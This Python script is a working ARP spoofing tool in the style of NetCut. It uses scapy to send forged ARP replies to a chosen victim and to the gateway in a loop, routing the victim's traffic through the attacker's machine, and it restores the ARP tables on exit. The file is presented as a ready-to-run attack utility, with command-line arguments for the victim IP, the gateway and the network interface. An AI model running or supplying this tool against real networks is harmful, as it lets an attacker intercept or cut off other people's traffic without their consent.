#!/usr/bin/python

import argparse
import sys
import time

import scapy.all as scapy
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)


class ArpSpoofer:
    """NetCut-style ARP spoofing helper.

    The class repeatedly poisons both a victim and the gateway so that all traffic
    is routed through the attacker's MAC address. CTRL+C restores the ARP tables
    before exiting.
    """

    def __init__(self, target_ip: str, gateway_ip: str, interface: str, interval: float = 2.0):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.interval = interval

    def get_mac(self, ip: str) -> str:
        """Query the network for the MAC address of ``ip``.

        Returns the MAC address if discovered, otherwise raises ``RuntimeError``.
        """

        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answered, _ = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)

        if not answered:
            raise RuntimeError(f"Could not find MAC address for {ip}")

        return answered[0][1].hwsrc

    def spoof(self, target_ip: str, spoof_ip: str) -> None:
        """Send one ARP reply to convince ``target_ip`` we are ``spoof_ip``."""

        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.YELLOW + f"[+] Spoofed {target_ip} -> {spoof_ip}")

    def restore(self, dest_ip: str, source_ip: str) -> None:
        """Restore ``dest_ip`` ARP entry for ``source_ip``."""

        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, count=3, verbose=False)
        print(Fore.GREEN + f"[+] Restored ARP for {dest_ip} -> {source_ip}")

    def run(self) -> None:
        """Continuously poison target and gateway like NetCut until interrupted."""

        try:
            while True:
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)
                time.sleep(self.interval)
        except KeyboardInterrupt:
            print(Fore.RED + "[!] CTRL+C detected. Restoring ARP tables...")
            self.restore(self.target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, self.target_ip)
            print(Fore.GREEN + "[+] Cleanup complete. Exiting.")


class ExampleArgumentParser(argparse.ArgumentParser):
    """Argument parser that prints a helpful usage example on errors."""

    def error(self, message):
        self.print_usage(sys.stderr)
        example = "python spoofer.py -t 192.168.1.130 -g 192.168.1.1 -i eth0"
        self.exit(2, f"{self.prog}: error: {message}\nExample: {example}\n")


if __name__ == "__main__":
    parser = ExampleArgumentParser(description="NetCut-style ARP spoofing helper")
    parser.add_argument("-t", "--target", required=True, help="Victim IP address to poison")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address to impersonate")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument(
        "--interval",
        type=float,
        default=2.0,
        help="Seconds to wait between ARP replies (default: 2.0)",
    )

    args = parser.parse_args()

    spoofer = ArpSpoofer(
        target_ip=args.target,
        gateway_ip=args.gateway,
        interface=args.interface,
        interval=args.interval,
    )
    spoofer.run()
